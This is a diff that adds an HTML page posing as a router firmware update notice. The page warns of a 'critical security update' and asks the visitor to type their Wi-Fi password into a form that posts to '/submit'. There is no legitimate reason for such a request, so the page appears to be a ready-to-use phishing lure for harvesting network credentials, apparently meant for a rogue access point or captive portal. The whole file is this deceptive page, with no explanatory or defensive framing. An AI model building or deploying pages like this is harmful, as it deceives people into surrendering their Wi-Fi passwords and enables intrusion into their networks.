@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Router Firmware Update</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="cache-control" content="no-cache">
+    <meta http-equiv="expires" content="0">
+    <meta http-equiv="pragma" content="no-cache">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: Arial, sans-serif;
+            background: #f7f7f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background: #fff;
+            padding: 30px 24px;
+            border-radius: 10px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.12);
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
+        .router-icon {
+            font-size: 48px;
+            margin-bottom: 16px;
+        }
+        h1 {
+            font-size: 22px;
+            color: #222;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .badge {
+            display: inline-block;
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            color: #856404;
+            font-size: 12px;
+            padding: 4px 10px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            text-align: left;
+            font-size: 13px;
+            color: #444;
+            margin-bottom: 6px;
+            font-weight: bold;
+        }
+        input[type="password"] {
+            width: 100%;
+            padding: 11px 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 15px;
+            margin-bottom: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        input[type="password"]:focus {
+            border-color: #007BFF;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #007BFF;
+            color: #fff;
+            font-size: 15px;
+            font-weight: bold;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        .footer-note {
+            margin-top: 16px;
+            font-size: 11px;
+            color: #aaa;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>Firmware Update Required</h1>
+    <div class="badge">Action Required</div>
+    <p>
+        Your router has a critical security update available.
+        Please enter your Wi-Fi password to authenticate and
+        begin the update process.
+    </p>
+    <form method="POST" action="/submit">
+        <label for="password">Wi-Fi Network Password</label>
+        <input type="password" id="password" name="password" placeholder="Enter your Wi-Fi password" required autocomplete="current-password">
+        <button type="submit">Update Now</button>
+    </form>
+    <p class="footer-note">This update takes approximately 5 minutes. Do not disconnect from Wi-Fi.</p>
+</div>
+</body>
+</html>
